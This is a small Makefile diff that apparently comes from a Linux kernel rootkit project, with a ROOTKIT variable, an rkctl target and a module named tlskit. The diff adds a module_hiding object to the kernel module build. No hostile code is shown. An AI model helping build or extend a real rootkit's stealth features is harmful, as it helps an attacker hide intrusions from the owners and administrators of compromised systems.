@@ -5,7 +5,8 @@ all: rkctl tlskit
 
 obj-m += $(ROOTKIT).o
 
-tlskit-objs += $(SRC_DIR)/lkm.o
+tlskit-objs += 	$(SRC_DIR)/lkm.o \
+				$(SRC_DIR)/module_hiding.o
 
 tlskit:
 	echo "Compiling lkm tlskit ..."
